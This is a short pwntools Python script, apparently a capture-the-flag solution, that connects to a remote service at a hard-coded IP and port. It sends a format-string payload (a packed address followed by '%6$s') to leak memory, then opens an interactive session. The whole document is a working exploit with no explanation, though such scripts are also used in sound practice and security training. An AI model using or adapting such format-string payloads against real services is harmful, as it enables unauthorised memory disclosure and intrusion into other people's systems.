from pwn import *

# r = process("./meta")
r = remote("159.203.38.169", 5685)

r.sendlineafter("meta?\n", "\xec\x89\x04\x08%6$s")

r.interactive()
